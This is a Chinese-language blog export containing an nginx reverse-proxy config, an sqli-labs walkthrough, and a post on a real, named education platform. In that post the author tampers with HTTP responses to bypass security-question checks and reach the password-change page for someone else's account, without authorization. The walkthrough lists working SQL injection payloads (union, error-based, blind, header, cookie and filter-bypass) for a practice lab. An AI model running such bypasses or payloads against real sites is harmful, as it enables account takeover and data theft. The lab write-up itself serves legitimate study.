class=\"line\"></span><br><span class=\"line\">#error_log  logs/error.log;</span><br><span class=\"line\">#error_log  logs/error.log  notice;</span><br><span class=\"line\">#error_log  logs/error.log  info;</span><br><span class=\"line\"></span><br><span class=\"line\">#pid        logs/nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">    worker_connections  1024;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">http &#123;</span><br><span class=\"line\">    include       mime.types;</span><br><span class=\"line\">    default_type  application/octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">    #log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class=\"line\">    #                  &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class=\"line\">    #                  &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">    #access_log  logs/access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">    sendfile        on;</span><br><span class=\"line\">    #tcp_nopush     on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #keepalive_timeout  0;</span><br><span class=\"line\">    keepalive_timeout  65;</span><br><span class=\"line\"></span><br><span class=\"line\">    #gzip  on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #在http&#123;&#125;内配置</span><br><span class=\"line\">    #自己进行负载均衡配置，weight为权重</span><br><span class=\"line\">    upstream sms&#123;</span><br><span class=\"line\">        server ip:port weight=1;</span><br><span class=\"line\">        server ip:port weight=1;</span><br><span class=\"line\">        #保证收发都是同一个连接</span><br><span class=\"line\">        ip_hash;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    upstream xxx&#123;</span><br><span class=\"line\">        ......</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        listen       80;</span><br><span class=\"line\">        server_name  localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">        #charset koi8-r;</span><br><span class=\"line\"></span><br><span class=\"line\">        #access_log  logs/host.access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">            index  index.html index.htm;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #配置自己的转发,在server&#123;&#125;内配置</span><br><span class=\"line\">          #过来的url</span><br><span class=\"line\">          location /smsCollection/ &#123;</span><br><span class=\"line\">              #转发的url</span><br><span class=\"line\">              proxy_pass http://sms;</span><br><span class=\"line\">              proxy_set_header    REMOTE-HOST $remote_addr;</span><br><span class=\"line\">              proxy_set_header   Host $host:8080;</span><br><span class=\"line\">              proxy_set_header   X-Real-IP $remote_addr;</span><br><span class=\"line\">              proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class=\"line\">              proxy_read_timeout 300s;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">          location /SmsUpstream-1.0/sms191 &#123;</span><br><span class=\"line\">              .....</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #error_page  404              /404.html;</span><br><span class=\"line\"></span><br><span class=\"line\">        # redirect server error pages to the static page /50x.html</span><br><span class=\"line\">        #</span><br><span class=\"line\">        error_page   500 502 503 504  /50x.html;</span><br><span class=\"line\">        location = /50x.html &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ \\.php$ &#123;</span><br><span class=\"line\">        #    proxy_pass   http://127.0.0.1;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ \\.php$ &#123;</span><br><span class=\"line\">        #    root           html;</span><br><span class=\"line\">        #    fastcgi_pass   127.0.0.1:9000;</span><br><span class=\"line\">        #    fastcgi_index  index.php;</span><br><span class=\"line\">        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class=\"line\">        #    include        fastcgi_params;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # deny access to .htaccess files, if Apache&apos;s document root</span><br><span class=\"line\">        # concurs with nginx&apos;s one</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ /\\.ht &#123;</span><br><span class=\"line\">        #    deny  all;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # another virtual host using mix of IP-, name-, and port-based configuration</span><br><span class=\"line\">    #</span><br><span class=\"line\">    #server &#123;</span><br><span class=\"line\">    #    listen       8000;</span><br><span class=\"line\">    #    listen       somename:8080;</span><br><span class=\"line\">    #    server_name  somename  alias  another.alias;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    location / &#123;</span><br><span class=\"line\">    #        root   html;</span><br><span class=\"line\">    #        index  index.html index.htm;</span><br><span class=\"line\">    #    &#125;</span><br><span class=\"line\">    #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # HTTPS server</span><br><span class=\"line\">    #</span><br><span class=\"line\">    #server &#123;</span><br><span class=\"line\">    #    listen       443 ssl;</span><br><span class=\"line\">    #    server_name  localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_certificate      cert.pem;</span><br><span class=\"line\">    #    ssl_certificate_key  cert.key;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_session_cache    shared:SSL:1m;</span><br><span class=\"line\">    #    ssl_session_timeout  5m;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class=\"line\">    #    ssl_prefer_server_ciphers  on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    location / &#123;</span><br><span class=\"line\">    #        root   html;</span><br><span class=\"line\">    #        index  index.html index.htm;</span><br><span class=\"line\">    #    &#125;</span><br><span class=\"line\">    #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"成都安全教育平台修改密码","date":"2019-03-12T19:54:01.000Z","_content":"\n### 1.起因\n今天暂时写完了手上的后端接口，有点时间，想起前几天看见女朋友用的安全教育平台有个密码找回功能。<br>\n喜闻乐见，大家都知道这是个漏洞高发区。刚好去年看过几篇这方面的文章，一直没实践过，今天刚好练习下（我是未入门菜鸟）。\n### 2.具体过程\n登录页面<br>\n看见这个已运行800天，心里就是一动，多半会成功了。\n![登录](./login.png)\n密码找回页面<br>\n在这一步需要填一些信息<br>\n首先你要知道自己要改谁的密码，所以这一步的信息默认自己已知\n![back_1](./password_back_1.png)\n密码找回页面2<br>\n要求在这里输入密保信息进行验证<br>\n由于不知道信息，所以想办法绕过<br>\n首先查看网页源代码，看看有没有逻辑漏洞<br>\n![back_2](./password_back_2.png)\n源代码<br>\n可以看到这里直接通过判断返回值中Result（boolean）来确定有没有验证成功，没有其它限制<br>\n所以首先想到通过拦截返回包，修改返回值\n![code](./origin_code.png)\n返回包<br>\n将返回包中Result改为true，再发回页面\n![check](./check.png)\n新密码<br>\n如图,成功跳转到修改密码界面<br>\n![modify](./modify.png)\n\n\n实际修改密码时返回非法操作，观察发现需要传入一个DesSucuss字段，为48位hash,多次测试，该值不变<br>\n所以猜测为固定字段hash,暂未找到hash方式\n","source":"_posts/security/example/成都安全教育平台/chengdu.xueanquan.com.md","raw":"---\ntitle: 成都安全教育平台修改密码\ndate: 2019-3-12 15:54:01\ntags: [security]\n---\n\n### 1.起因\n今天暂时写完了手上的后端接口，有点时间，想起前几天看见女朋友用的安全教育平台有个密码找回功能。<br>\n喜闻乐见，大家都知道这是个漏洞高发区。刚好去年看过几篇这方面的文章，一直没实践过，今天刚好练习下（我是未入门菜鸟）。\n### 2.具体过程\n登录页面<br>\n看见这个已运行800天，心里就是一动，多半会成功了。\n![登录](./login.png)\n密码找回页面<br>\n在这一步需要填一些信息<br>\n首先你要知道自己要改谁的密码，所以这一步的信息默认自己已知\n![back_1](./password_back_1.png)\n密码找回页面2<br>\n要求在这里输入密保信息进行验证<br>\n由于不知道信息，所以想办法绕过<br>\n首先查看网页源代码，看看有没有逻辑漏洞<br>\n![back_2](./password_back_2.png)\n源代码<br>\n可以看到这里直接通过判断返回值中Result（boolean）来确定有没有验证成功，没有其它限制<br>\n所以首先想到通过拦截返回包，修改返回值\n![code](./origin_code.png)\n返回包<br>\n将返回包中Result改为true，再发回页面\n![check](./check.png)\n新密码<br>\n如图,成功跳转到修改密码界面<br>\n![modify](./modify.png)\n\n\n实际修改密码时返回非法操作，观察发现需要传入一个DesSucuss字段，为48位hash,多次测试，该值不变<br>\n所以猜测为固定字段hash,暂未找到hash方式\n","slug":"security/example/成都安全教育平台/chengdu.xueanquan.com","published":1,"updated":"2019-10-13T12:15:12.180Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321m5005m6dcplfngv9il","content":"<h3 id=\"1-起因\"><a href=\"#1-起因\" class=\"headerlink\" title=\"1.起因\"></a>1.起因</h3><p>今天暂时写完了手上的后端接口，有点时间，想起前几天看见女朋友用的安全教育平台有个密码找回功能。<br><br>喜闻乐见，大家都知道这是个漏洞高发区。刚好去年看过几篇这方面的文章，一直没实践过，今天刚好练习下（我是未入门菜鸟）。</p>\n<h3 id=\"2-具体过程\"><a href=\"#2-具体过程\" class=\"headerlink\" title=\"2.具体过程\"></a>2.具体过程</h3><p>登录页面<br><br>看见这个已运行800天，心里就是一动，多半会成功了。<br><img src=\"./login.png\" alt=\"登录\"><br>密码找回页面<br><br>在这一步需要填一些信息<br><br>首先你要知道自己要改谁的密码，所以这一步的信息默认自己已知<br><img src=\"./password_back_1.png\" alt=\"back_1\"><br>密码找回页面2<br><br>要求在这里输入密保信息进行验证<br><br>由于不知道信息，所以想办法绕过<br><br>首先查看网页源代码，看看有没有逻辑漏洞<br><br><img src=\"./password_back_2.png\" alt=\"back_2\"><br>源代码<br><br>可以看到这里直接通过判断返回值中Result（boolean）来确定有没有验证成功，没有其它限制<br><br>所以首先想到通过拦截返回包，修改返回值<br><img src=\"./origin_code.png\" alt=\"code\"><br>返回包<br><br>将返回包中Result改为true，再发回页面<br><img src=\"./check.png\" alt=\"check\"><br>新密码<br><br>如图,成功跳转到修改密码界面<br><br><img src=\"./modify.png\" alt=\"modify\"></p>\n<p>实际修改密码时返回非法操作，观察发现需要传入一个DesSucuss字段，为48位hash,多次测试，该值不变<br><br>所以猜测为固定字段hash,暂未找到hash方式</p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1-起因\"><a href=\"#1-起因\" class=\"headerlink\" title=\"1.起因\"></a>1.起因</h3><p>今天暂时写完了手上的后端接口，有点时间，想起前几天看见女朋友用的安全教育平台有个密码找回功能。<br><br>喜闻乐见，大家都知道这是个漏洞高发区。刚好去年看过几篇这方面的文章，一直没实践过，今天刚好练习下（我是未入门菜鸟）。</p>\n<h3 id=\"2-具体过程\"><a href=\"#2-具体过程\" class=\"headerlink\" title=\"2.具体过程\"></a>2.具体过程</h3><p>登录页面<br><br>看见这个已运行800天，心里就是一动，多半会成功了。<br><img src=\"./login.png\" alt=\"登录\"><br>密码找回页面<br><br>在这一步需要填一些信息<br><br>首先你要知道自己要改谁的密码，所以这一步的信息默认自己已知<br><img src=\"./password_back_1.png\" alt=\"back_1\"><br>密码找回页面2<br><br>要求在这里输入密保信息进行验证<br><br>由于不知道信息，所以想办法绕过<br><br>首先查看网页源代码，看看有没有逻辑漏洞<br><br><img src=\"./password_back_2.png\" alt=\"back_2\"><br>源代码<br><br>可以看到这里直接通过判断返回值中Result（boolean）来确定有没有验证成功，没有其它限制<br><br>所以首先想到通过拦截返回包，修改返回值<br><img src=\"./origin_code.png\" alt=\"code\"><br>返回包<br><br>将返回包中Result改为true，再发回页面<br><img src=\"./check.png\" alt=\"check\"><br>新密码<br><br>如图,成功跳转到修改密码界面<br><br><img src=\"./modify.png\" alt=\"modify\"></p>\n<p>实际修改密码时返回非法操作，观察发现需要传入一个DesSucuss字段，为48位hash,多次测试，该值不变<br><br>所以猜测为固定字段hash,暂未找到hash方式</p>\n"},{"title":"sql-labs注入","date":"2018-08-28T15:30:20.000Z","_content":"## SQL注入\nsql注入:利用现有程序，使之执行构造的payload.\n\n### 一. 环境搭建\n- ubuntu16.04虚拟机\n- 更新阿里源 apt-get update\n- 安装mysql apt-get install mysql-server mysql-client -y\n- 安装apache apt-get install apache2 -y\n- 安装git apt-get install git -y\n- 项目 cd /var/www && sudo git clone https://github.com/Audi-1/sqli-labs.git sqli-labs  \n- 更改项目的mysql配置文件为自己数据库\n- 现在在浏览器localhost/sqli-labs已经可以访问到了\n\n##### 问题\n- navicat连不上mysql </br>\n\t注释 /etc/mysql/mysql.cnf.d/mysqld.cnf 中bind 127.0.0.1</br>\n\t修改select user, host from user;  update user set host = \"%\" where host = 'localhost';  flush privileges;\n- php版本导致mysql_connect()废弃 </br>\n\t安装phpstorm 配置phpcgi  apt-get install php版本-cgi</br>\n\t降低版本到php5.6错误仍然在</br>\n\t第二天重启Phpstrom 打开网页，错误消失</br>\n  猜测是降低版本有效，但第一天有缓存</br>\n<!-- more -->\n### 二.sqli-labs\n参考了大牛的教程https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf\n\n- ** less1 GET-Error based - Single quotes - String </br> **\n\tphp中代码 SELECT * FROM users WHERE id='$id' LIMIT 0,1;\n\t%20 空格 %27 单引号 %3D 等于号</br>\n\t一：?id=(select%20id%20from%20users%20where%20username%20%3D\"admin\") 未成功  \t’$id' 注入被单引号包裹，将输入变成了字符串</br>\n\t二：?id='%20and%20username%3D%27admin 未成功 id=''这个条件未绕过\n\t想利用id=这个条件或者绕过这个条件</br>\n\t三：?id='%20or%20username%3D%27admin 成功</br>\n\t基于二，转换思路，利用or成功绕过</br>\n\t爆破数据库版本</br>\n\t?id=-1%27%20%20union%20select%201%2cversion()%2c3%23</br>\n\t？id=-1'  union select 1,version(),3#</br>\n\tunion必须列一样，所以1和3是为了保持三列\n\n- ** less 2 GET - Error based -Intiger based</br> **\n\tphp中代码 $sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";</br>\n\t$id未加引号过滤输入</br> ?id=(select%20id%20from%20users%20where%20username%20%3D\"admin\")成功注入\n\n- ** less 3 GET - Error based - single quotes with twist - string**</br>\n\tphp中代码 $sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\"; 用括号和单引号进行了过滤</br>\n\t思路：消除括号</br>\n\t?id=%27)or%20username%3D%27admin%27or%20(%27  成功\n\n\n- ** less 4  GET - Error based - Double Quotes - String ** </br>\n\tphp中代码</br>\n\t$id = '\"' . $id . '\"';</br>\n\t$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";</br>\n\t?id=%27)or%20username%3D%27admin%27or%20(%27 成功</br>\n\n    关于前四个less的一些心得：\n    \t1.找错误：\n    \t\t尝试着单引号，双引号，括号等特殊字符注入，如果有报错信息，多半就是该符号出问题\n    \t\t例：?id=\"\n    \t\t\t\t 返回You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"\"\") LIMIT 0,1' at line 1\n    \t\t\t可以看出输入所在位置为（“输入”）\n    \t2.注入利用\n    \t\t通过union来执行自己想要的sql\n\n- ** less 5  GET - Double Injection - Single Quotes - String ** </br>\n双查询注入（双查询：select嵌套select）</br>\n\t输入?id=‘ 失败， use near 1  由此猜测为单引号</br>\n\t?id='%20or%20username%3D%27admin 成功 </br>\n\t但是sql执行结果前端并没有进行输出，怎么利用？</br>\n\n\t查询资料后发现：Double injection 双注入。一些研究人员发现，使用group by子句结合rand()函数以及像count（\\*）这样的聚合函数，在SQL查询时会出现错误，这种错误是随机产生的，这就产生了双重查询注入。</br>\n\t发现多查询几次会爆出duplicate entry的错误，且将我们需要的信息都爆出来了。（正常结果未返回显示，所以通过错误信息去获得我们想要的信息，有随机性，需要重复多次）</br>\n\tcount() 计数</br>\n\trand() 随机</br>\n\tgroup by 分组</br>\n\tfloor() 向下取整，舍弃小数部分</br>\n\n\t?id=-1%27%20union%20select%201%2c(select%20count(\\*)%20from%20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)\\*2)))%2c3%20%23 成功</br>\n\tDuplicate entry '5.7.23-0ubuntu0.16.04.11' for key ''\n\t其中version(）是我们希望执行的函数，可以换成其它\n\n- ** less 6 GET - Double Injection - Double Quotes - String ** </br>\n\n\t?id=-1%22%20union%20select%201%2c(select%20count(\\*)%20from%\t\t20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)\\*2)))%2c3%20%23 成功\n\n- ** less 7 GET - Dump into outfile - String ** </br>\n\t文件导入限制条件多，未成功\n\n- ** less 8 GET - Blind - Boolian Based - Single Quotes ** </br>\n\t?id=-1%27or%201%3d1%23 </br>\n\t利用二分与返回结果的正确与否，来猜测验证数据库内容\n\n- ** less 9 GET - Blind - Time Based - Single Quotes ** </br>\n\t?id=1%27%20and%20if(ascii(substr(database(),1,1))>116,%200,%20sleep(5))%20%23 </br>\n\t因为在这正确或者错误都是返回的\"you are in\" 所以不能区分 </br>\n  ![youarein](./youarein.png)\n\t使用时间延迟，例子为判断数据库名字第一个字是否为s(ascii码为115)，要进行多次尝试\n\n- ** less 10 GET -Blind - Time Based - Double Quotes ** </br>\n\t?id=1\"%20and%20if(ascii(substr(database(),1,1))>116,%200,%20sleep(5))%20%23\n\n- ** less 11 POST - Error Based -Single Qoutes - String ** </br>\n\tusername:  \n      1.admin ' # admin用户</br>\n      2.adimn ' or 1=1 # 万能</br>\n      3. ' union select version(),1 # 等其它操作\n\tpasswd:\n    因为username已经用#将后面注释了，所以passwd随意输入\n\n- ** less 12 POST - Error Based - Double Quotes - String - with twist ** </br>\n将less11的单引号改为 “）\n\n- ** less 13 POST - Double Injection - Single quotes - String - with twist ** </br>\n\tusername:    ') union select (select count(\\*) from information_schema.schemata group by concat(version(),floor(rand(0)\\*2))),1 #</br>\n\t返回信息Duplicate entry '5.7.23-0ubuntu0.16.04.11' for key ''</br>\n\t另外这种有正确/错误提示的，都可以二分盲注来猜测验证\n\n- ** less 14 POST  - Double Injection - Double quotes - String ** </br>\n\tless13 ') 换为 ”\n\n- ** less 15 POST - Blind - Boolean/Time Based -Single Quotes ** </br>\n\tusername: ' or 1=1 # 登录成功 </br>\n\t思路：利用or/and/if sleep()等来进行猜测</br>\n\n- ** less 16 POST - Blind - Boolean/Time Based - Double Quotes - with twist ** </br>\n\t将less15 ' 换成 \")\n\n- ** less 17 POST - Update Query - Error Based - String ** </br>\n\t这里对用户名进行了过滤</br>\n\t利用报错进行注入输出 </br>\n\tuname=admin&passwd=11'and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&sub mit=Submit </br>\n\t输出结果XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1~'</br>\n  报错注入基本都是利用XPath进行报错\n\t有必要去买本书来系统的看一下mysql各种函数\n\n- ** less 18 POST - Header Injection - Uagent field - Error Based ** </br>\n\t这里需要正确的账号密码才能进行注入，因为插入操作是在登录判断成功后</br>\n\tphp中语句：$insert=\"INSERT INTO \\`security\\`.\\`uagents\\` (\\`uagent\\`, \\`ip_address\\`, \\`username\\`) VALUES ('$uagent', '$IP', $uname)\";</br>其中$IP不好修改，$uname与$password进行了过滤，所以考虑$uagent</br>\n\t将User-Agent 修改为 ‘ or extractvalue(1,concat(0x7e,version())) or ’</br>\n\t返回结果：XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1'\n\n- ** less 19 POST - Header Injection - Referer Field - Error Based ** </br>\n\t同less 18,进行了过滤，但执行了$insert=\"INSERT INTO \\`security\\`.\\`referers\\` (\\`referer\\`, \\`ip_address\\`) VALUES ('$uagent', '$IP')\";</br>\n\t其中：$uagent = $\\_SERVER['HTTP_REFERER'];</br>\n\t将Referer 修改为: 'or extractvalue(1,concat(0x7e,database())) or'</br>\n\t返回: XPATH syntax error: '~security'\n\n- ** less 20 POST - Cookie Injection - Uagent Field - Error Based ** </br>\n\t进行了过滤</br>\n\t$cookee = $\\_COOKIE['uname'];</br>\n\t$sql=\"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1\";</br>\n\t流程是登录成功后产生cookie,此时修改cookie,进行注入(在chrome浏览器中使用tamper插件进行请求的拦截修改)</br>\n\t修改Cookie为： uname=-1' union select 1,(select version()),3 #</br>\n\t返回 ：\n           Your Login name:5.7.23-0ubuntu0.16.04.1\n\t\t   Your Password:3\n\t\t   Your ID:1\n\t也可以用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显</br>\n\t uname=admin'and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# </br>\n\t返回:Issue with your mysql: XPATH syntax error: '~/usr/~'\n\n- ** less 21 POST - Cookie Injection - Error Based - Base64 Encode - Single Quotes - String ** </br>\n\tsetcookie('uname', base64_encode($row1['username']), time()+3600);\n\t$sql=\"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1\";</br>\n\t对Cookie 进行了 base64处理 </br>\n\tuname=LTEnKSB1bmlvbiBzZWxlY3QgMSwoc2VsZWN0IHZlcnNpb24oKSksMyAj\n\tuname=-1') union select 1,(select version()),3 #</br>\n\t返回：</br>\n  Your Login name:5.7.23-0ubuntu0.16.04.1</br>\n\t Your Password:3</br>\n\tYour ID:1\n\n- ** less 22 POST - Cookie Injection - Error Based - Base64 Encode - Double Quotes - String ** </br>\n\t对Cookie进行了base64编码，使用的双引号\n\n----------------------------------------------------------------------\n\n- ** less 23 GET - Error Based - Strip Comments ** </br>\n\tphp中处理：</br>\n\t$reg = \"/#/\";</br>\n\t$reg1 = \"/--/\";</br>\n\t$replace = \"\";</br>\n\t$id = preg_replace($reg, $replace, $id); //将$reg替换为$replace</br>\n\t$id = preg_replace($reg1, $replace, $id);</br>\n\t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";</br>\n\t因为过滤了注释符号，所以自己添加引号来闭合,同样可以使用报错/延时注入等</br>\n\t?id=-1%27%20union%20select%201%2c(select%20version())%2c3%20%27</br>\n\t返回：</br>\n  Your Login name:5.7.23-0ubuntu0.16.04.1</br>\n\tYour Password:3\n\n- ** less 24 POST - Second Order Injection \\*Real treat\\* - Stored Injections ** </br>\n\t本关为二次注入的示范例。二次注入也称为存储型的注入，就是将可能导致 sql 注入的字符先存入到数据库中， 当再次调用这个恶意构造的字符时， 就可以触发 sql 注入</br>\n\tphp中:</br>\n      $sql = \"select count(\\*) from users where username='$username'\";\n\t\t  $res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');\n\t\t  $sql = \"insert into users ( username, password) values(\\\"$username\\\", \\\"$pass\\\")\";\n\t\t  $sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \";\n\t先注册一个admin'#用户，更改其密码，实际上是更改的admin的密码\n\n- **less 25 GET - Error Based - All your OR & AND Belong to us - String - Single Quotes**</br>\n\t$id= preg_replace('/or/i',\"\", $id);\t\t\t//strip out OR (non case sensitive)</br>\n\t$id= preg_replace('/AND/i',\"\", $id);\t\t//Strip out AND (non case sensitive)</br>\n\t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";</br>\n\t思路：使用union\n\t绕过过滤：\n        （1）大小写变形 Or,OR,oR\n\t\t（2）编码，hex，urlencode\n\t\t（3）添加注释/*or*/\n\t\t（4）利用符号 and=&& or=||\n\t?id=1%27%20||%20%20extractvalue(1%2cconcat(0x7e%2cversion()))%23\n\t返回：XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1'\n\n- **less 25a GET - Blind Based - All your OR & AND Belong to us - String - Single Quotes** </br>\n\t$id= blacklist($id);</br>\n\t$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";</br>\n\t//print_r(mysql_error()); </br>\n\t报错注入不能用，所以使用基于布尔的注入，其中and/or进行了过滤</br>\n\t?id=-1%20||%20if(ascii(substr(database(),1,1))%3d117,0,1)判断数据库名字第一个字符是不是u(users库)</br>\n  然后依次这样，查出数据库名\n\n- **less 26 GETs - Error Based - All your Spaces and Comments Belong to us** </br>\n\tComments 注释</br>\n\tphp中:</br>\n\t   function blacklist($id)\n\t    {\n\t\t$id= preg_replace('/or/i',\"\", $id);\t\t\t//strip out OR (non case sensitive)\n\t\t$id= preg_replace('/and/i',\"\", $id);\t\t//Strip out AND (non case sensitive)\n\t\t$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t//strip out /*\n\t\t$id= preg_replace('/[--]/',\"\", $id);\t\t//Strip out --\n\t\t$id= preg_replace('/[#]/',\"\", $id);\t\t\t//Strip out #\n\t\t$id= preg_replace('/[\\s]/',\"\", $id);\t\t//Strip out spaces\n\t\t$id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id);\t\t//Strip out slashes\n\t\treturn $id;\n\t   }\n\t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";</br>\n\t思路：</br>\n  注释过滤了可以手动闭合引号，空格过滤\n\t可以使用  %a0  换行，</br>\n  /\\**/ 注释， （） 括号等绕过空格</br>\n\t此处注释不能使用，为了使用select时去掉末尾引号，空格也不行</br>\n\tid='111'union(select(1),(version()),(3)） ' LIMIT 0,1; 使用括号时，引号还在</br>\n\t?id=111%27union%a0select%a01%2cversion()%2c3||%271使用换行成功\n\n- **less 26a  GET - Blind Based - All your SPACES And COMMENTS Belong to us - Quotes-Parenthesis** </br>\n\t过滤和less26相同</br>\n\t$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";</br>\n\t?id=111%27)union%a0select%a01%2cversion()%2c3||(%271</br>\n\n\t思考：在盲注时，我们不知道进行了哪些过滤，可以构造特殊payload,如果返回原结果，则说明是我们所猜测的 %26为&</br>\n\t?id=1%27%26%26%271=1 猜测为’ ‘</br>\n\t?id=1%27)%26%26(%271=1 猜测为（’ ‘）</br>\n\t?id=1%22%26%26%221=1 猜测为 \" \"</br>\n\t?id=1%22)%26%26(%221=1 猜测为(\" \")</br>\n\t?id=1)%26%26(1=1  猜测为()</br>\n\t?id=1%26%261=1 无</br>\n等诸如此类</br>\n\n- **less 27 GET - Error Based - All your UNION & SELECT Belong to us - String - Single Quotes**</br>\n  \tfunction blacklist($id)\n  \t{\n  \t$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t//strip out /*\n  \t$id= preg_replace('/[--]/',\"\", $id);\t\t//Strip out --.\n  \t$id= preg_replace('/[#]/',\"\", $id);\t\t\t//Strip out #.\n  \t$id= preg_replace('/[ +]/',\"\", $id);\t    //Strip out spaces.\n  \t$id= preg_replace('/select/m',\"\", $id);\t    //Strip out spaces.\n  \t$id= preg_replace('/[ +]/',\"\", $id);\t    //Strip out spaces.\n  \t$id= preg_replace('/union/s',\"\", $id);\t    //Strip out union\n  \t$id= preg_replace('/select/s',\"\", $id);\t    //Strip out select\n  \t$id= preg_replace('/UNION/s',\"\", $id);\t    //Strip out UNION\n  \t$id= preg_replace('/SELECT/s',\"\", $id);\t    //Strip out SELECT\n  \t$id= preg_replace('/Union/s',\"\", $id);\t    //Strip out Union\n  \t$id= preg_replace('/Select/s',\"\", $id);\t    //Strip out select\n  \treturn $id;\n  \t}\n\n\t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";</br>\n\n\t思路一：大小写绕过</br>\n\t?id=111%27%a0uNioN%a0sElEct%a01,version(),3%a0%27</br>\n\t思路二：报错或延时？\n\n- **less 27a GET - Blind Based - All your UNION & SELECT Belong to us -Double Quotes**</br>\n\t1.?id=1%22%26%26%221=1 成功，猜测为“ \"过滤</br>\n\t2.?id=111%22%a0uNioN%a0sElEct%a01,version(),3%a0%22成功注入</br>\n\n- **less 28 GET - Error Based - All your UNION & SELECT Belong to us - String - Single Quotes with Parentesis**</br>\n  \tfunction blacklist($id)\n  \t{\n  \t$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t\t\t//strip out /*\n  \t$id= preg_replace('/[--]/',\"\", $id);\t\t\t\t//Strip out --.\n  \t$id= preg_replace('/[#]/',\"\", $id);\t\t\t\t\t//Strip out #.\n  \t$id= preg_replace('/[ +]/',\"\", $id);\t    \t\t//Strip out spaces.\n  \t$id= preg_replace('/select/m',\"\", $id);\t   \t\t \tStrip out spaces.\n  \t$id= preg_replace('/[ +]/',\"\", $id);\t    \t\t//Strip out spaces.\n  \t$id= preg_replace('/union\\s+select/i',\"\", $id);\t    //Strip out UNION & SELECT.\n  \treturn $id;\n  \t}\n\t   $sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\n\t?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27\n\n  - **less 28a GET - Error Based - All your UNION & SELECT Belong to us - String - Single Quotes - Parentesis**</br>\n    \tfunction blacklist($id)\n    \t{\n    \t$id= preg_replace('/union\\s+select/i',\"\", $id);\t    //Strip out spaces.\n    \treturn $id;\n    \t}\n    \t$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\n\t?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27   与less28相同\n\n- **less 29 GET Error Based - IMPIDENCE MISMATCH - Having a WAF in Front of Web Application**</br>\n服务器（两层架构）</br>\n\t当?id=1&id=2， apache（php）解析最后一个参数，即显示 id=2 的内容。Tomcat（jsp）解析第 一个参数，即显示 id=1 